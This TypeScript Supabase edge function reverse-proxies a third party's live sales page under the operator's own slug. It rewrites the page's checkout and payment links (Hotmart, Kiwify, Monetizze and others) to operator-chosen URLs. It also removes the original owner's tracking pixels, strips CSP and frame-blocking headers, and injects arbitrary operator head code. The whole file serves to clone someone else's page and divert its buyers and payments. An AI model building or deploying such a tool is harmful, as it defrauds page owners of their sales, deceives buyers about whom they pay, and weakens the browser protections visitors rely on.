import { createClient } from 'https://esm.sh/@supabase/supabase-js@2.49.2';

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version',
};

const USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';

interface ReplacedLink {
  original: string;
  new: string;
}

const GLOBAL_REPLACE_MARKERS = new Set(["__GLOBAL__", "*", "__ALL__"]);
const CHECKOUT_HINT_RE = /(checkout|pay\.|pagamento|compra|comprar|carrinho|cart|order|pedido|hotmart|kiwify|monetizze|eduzz|perfectpay|braip)/i;

Deno.serve(async (req) => {
  // Handle CORS preflight
  if (req.method === 'OPTIONS') {
    return new Response('ok', { headers: corsHeaders });
  }

  try {
    const url = new URL(req.url);
    const slug = url.searchParams.get('slug');
    
    if (!slug) {
      console.log('[serve-proxy] No slug provided');
      return new Response(
        JSON.stringify({ error: 'Slug not found' }), 
        { status: 404, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    console.log(`[serve-proxy] Serving page with slug: ${slug}`);

    // 1. Get page config from database using SERVICE_ROLE_KEY to bypass RLS
    // This ensures we can always read published pages regardless of auth context
    const supabaseUrl = Deno.env.get('SUPABASE_URL');
    const supabaseServiceKey = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY');
    
    if (!supabaseUrl || !supabaseServiceKey) {
      console.error('[serve-proxy] Missing SUPABASE_URL or SUPABASE_SERVICE_ROLE_KEY');
      return new Response(
        JSON.stringify({ error: 'Server configuration error' }), 
        { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    const supabase = createClient(supabaseUrl, supabaseServiceKey);

    const { data: page, error: dbError } = await supabase
      .from('cloned_pages')
      .select('source_url, links, head_code, is_published')
      .eq('slug', slug)
      .eq('is_published', true)
      .maybeSingle();
    
    console.log(`[serve-proxy] DB query result - page: ${page ? 'found' : 'null'}, error: ${dbError?.message || 'none'}`);

    if (dbError) {
      console.error('[serve-proxy] Database error:', dbError);
      return new Response(
        JSON.stringify({ error: 'Database error' }), 
        { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    if (!page) {
      console.log('[serve-proxy] Page not found or not published');
      return new Response(
        JSON.stringify({ error: 'Page not found' }), 
        { status: 404, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    console.log(`[serve-proxy] Fetching source: ${page.source_url}`);

    // 2. Fetch the original site in real-time (Tunneling/Reverse Proxy)
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 30000);

    let response: Response;
    try {
      response = await fetch(page.source_url, {
        method: 'GET',
        headers: {
          'User-Agent': USER_AGENT,
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
          'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
          'Accept-Encoding': 'gzip, deflate, br',
          'Cache-Control': 'no-cache',
          'Pragma': 'no-cache',
        },
        signal: controller.signal,
        redirect: 'follow',
      });
      clearTimeout(timeoutId);
    } catch (fetchError) {
      clearTimeout(timeoutId);
      console.error('[serve-proxy] Fetch error:', fetchError);
      
      if (fetchError instanceof Error && fetchError.name === 'AbortError') {
        return new Response(
          JSON.stringify({ error: 'Timeout - site demorou muito para responder' }), 
          { status: 504, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
        );
      }
      
      return new Response(
        JSON.stringify({ error: 'Erro ao acessar o site original' }), 
        { status: 502, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    // 3. Check content type - pass through non-HTML assets directly
    const contentType = response.headers.get('content-type') || '';
    
    if (!contentType.includes('text/html') && !contentType.includes('application/xhtml')) {
      // Stream non-HTML content directly (CSS, JS, images, etc.)
      console.log(`[serve-proxy] Passing through non-HTML content: ${contentType}`);
      
      const newHeaders = new Headers();
      response.headers.forEach((value, key) => {
        // Copy most headers but remove security-related ones
        const lowerKey = key.toLowerCase();
        if (!['x-frame-options', 'content-security-policy', 'x-content-type-options'].includes(lowerKey)) {
          newHeaders.set(key, value);
        }
      });
      
      // Add CORS and allow framing
      Object.entries(corsHeaders).forEach(([key, value]) => {
        newHeaders.set(key, value);
      });
      
      return new Response(response.body, {
        status: response.status,
        headers: newHeaders,
      });
    }

    // 4. Process HTML content
    let html = await response.text();
    const targetOrigin = new URL(page.source_url).origin;

    console.log(`[serve-proxy] Processing HTML (${html.length} bytes) from ${targetOrigin}`);

    // A. Remove existing base tags to avoid conflicts
    html = html.replace(/<base[^>]*>/gi, '');
    
    // B. Inject base tag (CRITICAL - fixes all relative assets instantly)
    const baseTag = `<base href="${targetOrigin}/" target="_self">`;
    if (html.toLowerCase().includes('<head>')) {
      html = html.replace(/<head>/i, `<head>\n${baseTag}`);
    } else if (html.toLowerCase().includes('<html>')) {
      html = html.replace(/<html[^>]*>/i, (match) => `${match}\n<head>${baseTag}</head>`);
    } else {
      html = `<head>${baseTag}</head>\n${html}`;
    }

    // C. Swap links (checkout/affiliate links replacement)
    // links is a JSONB array: [{ original, new }] OR legacy format [{ href, newHref }]
    // Note: some clients may accidentally store JSON as a string in jsonb.
    // We defensively parse it here.
    const rawLinks = (page as unknown as { links?: unknown }).links;
    let linksValue: unknown = rawLinks;
    if (typeof linksValue === 'string') {
      try {
        linksValue = JSON.parse(linksValue);
      } catch {
        // ignore
      }
    }

    interface LinkReplacement {
      original?: string;
      new?: string;
      href?: string;
      newHref?: string;
      mode?: string;
    }

    const shouldReplaceUrlGlobally = (value: string, targetOriginForCheck: string): boolean => {
      const v = (value || '').trim();
      if (!v) return false;
      if (v.startsWith('#')) return false;
      const lower = v.toLowerCase();
      if (lower.startsWith('mailto:') || lower.startsWith('tel:') || lower.startsWith('javascript:')) return false;

      // Replace only links that look like checkout/compra/pagamento or known checkout providers.
      if (CHECKOUT_HINT_RE.test(v)) return true;

      // If it's an absolute URL and points outside the origin, it could still be a checkout.
      // Keep this conservative (require hint) to avoid breaking nav/social links.
      try {
        const u = new URL(v);
        if (u.origin !== targetOriginForCheck && CHECKOUT_HINT_RE.test(u.hostname)) return true;
      } catch {
        // not an absolute URL
      }

      return false;
    };

    const applyGlobalReplace = (inputHtml: string, newUrl: string, targetOriginForCheck: string) => {
      let out = inputHtml;
      let replaced = 0;

      // Replace common destination-carrying attributes
      const attrRe = /(\b(?:href|action|formaction|data-href|data-url|data-link)\s*=\s*)(["'])([^"']+)(\2)/gi;
      out = out.replace(attrRe, (match, prefix, quote, value, endQuote) => {
        if (shouldReplaceUrlGlobally(value, targetOriginForCheck)) {
          replaced++;
          return `${prefix}${quote}${newUrl}${endQuote}`;
        }
        return match;
      });

      // Replace URLs embedded inside onclick="..."
      const onclickRe = /(\bonclick\s*=\s*)(["'])([\s\S]*?)(\2)/gi;
      out = out.replace(onclickRe, (match, prefix, quote, content, endQuote) => {
        if (!content || !CHECKOUT_HINT_RE.test(content)) return match;
        const updated = content.replace(/https?:\/\/[^'"\s]+/gi, (url: string) =>
          shouldReplaceUrlGlobally(url, targetOriginForCheck) ? newUrl : url
        );
        if (updated !== content) {
          replaced++;
          return `${prefix}${quote}${updated}${endQuote}`;
        }
        return match;
      });

      return { html: out, replaced };
    };

    if (linksValue && Array.isArray(linksValue)) {
      const linksData = linksValue as LinkReplacement[];
      let replacedCount = 0;

      // Global mode: replace checkout/button destinations broadly.
      const globalRule = linksData.find((l) => {
        const original = (l.original || l.href || '').trim();
        return (l.mode && l.mode.toLowerCase() === 'global') || GLOBAL_REPLACE_MARKERS.has(original);
      });

      if (globalRule) {
        const globalNew = (globalRule.new || globalRule.newHref || '').trim();
        if (globalNew) {
          const { html: updated, replaced } = applyGlobalReplace(html, globalNew, targetOrigin);
          html = updated;
          replacedCount += replaced;
          console.log(`[serve-proxy] Global replace applied (${replaced} replacements)`);
        }
      }

      // Exact replacements (original -> new)
      linksData.forEach((link) => {
        const originalUrl = (link.original || link.href || '').trim();
        const newUrl = (link.new || link.newHref || '').trim();

        if (!originalUrl || !newUrl || originalUrl === newUrl) return;
        if (GLOBAL_REPLACE_MARKERS.has(originalUrl)) return; // handled above

        const variants = [originalUrl];
        if (originalUrl.includes('&')) variants.push(originalUrl.replace(/&/g, '&amp;'));

        variants.forEach((variant) => {
          const escaped = variant.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');

          // Replace in common attributes (href/action/formaction/data-*)
          html = html.replace(
            new RegExp(`(\\b(?:href|action|formaction|data-href|data-url|data-link)\\s*=\\s*["'])${escaped}(["'])`, 'gi'),
            `$1${newUrl}$2`,
          );

          // Fallback: raw string replacement (covers inline scripts/data blobs)
          html = html.split(variant).join(newUrl);
        });

        replacedCount++;
      });

      console.log(`[serve-proxy] Replaced ${replacedCount} links`);
    } else {
      console.log('[serve-proxy] No links array configured for this page');
    }

    // D. Remove tracking scripts from original page FIRST (security/privacy measure)
    // This ensures the cloned page uses YOUR pixels, not the original owner's
    // Also remove meta CSP that could block injected pixels/tags inside srcDoc.
    html = html.replace(/<meta[^>]+http-equiv=["']content-security-policy["'][^>]*>/gi, '');
    html = html.replace(/<meta[^>]+content-security-policy[^>]*>/gi, '');

    html = html.replace(/<script[^>]*>([\s\S]*?)<\/script>/gi, (match) => {
      const lowerMatch = match.toLowerCase();
      if (lowerMatch.includes('google-analytics') || 
          lowerMatch.includes('gtag') ||
          lowerMatch.includes('fbq') ||
          lowerMatch.includes('facebook.net') ||
          lowerMatch.includes('hotjar') ||
          lowerMatch.includes('clarity.ms')) {
        return '<!-- original tracking script removed -->';
      }
      return match;
    });

    // E. Inject custom head scripts (Pixel, GTM, etc.) AFTER removing original tracking
    // This ensures user's pixels are not accidentally removed
    if (page.head_code && page.head_code.trim()) {
      if (html.toLowerCase().includes('</head>')) {
        html = html.replace(/<\/head>/i, `${page.head_code}\n</head>`);
      } else {
        html = `${html}\n${page.head_code}`;
      }
      console.log('[serve-proxy] Injected custom head code');
    }

    console.log(`[serve-proxy] Returning modified HTML (${html.length} bytes)`);

    // 5. Return modified HTML with permissive headers
    // CRITICAL: Use Blob with explicit MIME type to ensure browser renders as HTML
    const htmlBlob = new Blob([html], { type: 'text/html; charset=utf-8' });
    
    return new Response(htmlBlob, {
      status: 200,
      headers: {
        'X-Frame-Options': 'ALLOWALL',
        'Access-Control-Allow-Origin': '*',
        'Cache-Control': 'no-cache, no-store, must-revalidate',
      },
    });

  } catch (err) {
    console.error('[serve-proxy] Unexpected error:', err);
    return new Response(
      JSON.stringify({ error: err instanceof Error ? err.message : 'Unexpected error' }), 
      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );
  }
});
